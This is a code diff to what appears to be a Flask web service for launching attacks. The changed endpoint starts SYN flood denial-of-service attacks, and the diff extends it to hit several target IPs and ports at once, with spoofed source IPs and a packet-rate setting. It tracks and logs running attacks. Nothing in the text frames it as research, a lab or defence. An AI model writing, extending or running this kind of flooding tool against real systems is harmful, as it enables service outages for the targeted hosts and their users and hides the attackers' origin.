@@ -139,23 +139,32 @@ def start_syn_attack():
     """Start SYN flooding attack"""
     try:
         data = request.get_json()
-        target_ip = data.get('target_ip')
-        target_port = data.get('target_port', 80)
+        target_ips = data.get('target_ips') or []
+        target_ip_single = data.get('target_ip')
+        if target_ip_single:
+            target_ips.append(target_ip_single)
+        target_ports = data.get('target_ports') or []
+        if not target_ports and data.get('target_port'):
+            target_ports.append(int(data.get('target_port')))
+        if not target_ports:
+            target_ports = [80]
         num_threads = data.get('threads', 10)
+        rate_limit = data.get('rate_limit_pps')
+        spoof_pool = data.get('spoof_ips') or []
         
         # Validate
-        if not target_ip:
-            return jsonify({'error': 'Missing parameter: target_ip'}), 400
+        if not target_ips:
+            return jsonify({'error': 'Missing parameter: target_ip or target_ips'}), 400
         
         # Create unique attack ID
-        attack_id = f"syn_{target_ip}_{target_port}"
+        attack_id = f"syn_{target_ips[0]}_{target_ports[0]}"
         
         # Check if already running
         if attack_id in active_attacks:
             return jsonify({'error': 'Attack already running'}), 400
         
         # Create SYN flooder
-        flooder = SYNFlooder(target_ip, target_port, num_threads)
+        flooder = SYNFlooder(target_ips, target_ports, num_threads, spoof_pool=spoof_pool, rate_limit_pps=rate_limit)
         
         # Start in background thread
         def run_attack():
@@ -171,19 +180,19 @@ def start_syn_attack():
         active_attacks[attack_id] = {
             'object': flooder,
             'type': 'syn',
-            'target_ip': target_ip,
-            'target_port': target_port,
+            'target_ip': ','.join(target_ips),
+            'target_port': ','.join(map(str, target_ports)),
             'packets_sent': 0,
             'status': 'running'
         }
         
         # Log attack
-        log_attack('SYN_FLOODING', target_ip, None, 'running')
+        log_attack('SYN_FLOODING', ','.join(target_ips), None, 'running')
         
         return jsonify({
             'status': 'started',
             'attack_id': attack_id,
-            'message': f'SYN flooding attack started against {target_ip}:{target_port}'
+            'message': f'SYN flooding attack started against {','.join(target_ips)}:{','.join(map(str,target_ports))}'
         }), 200
     
     except Exception as e:
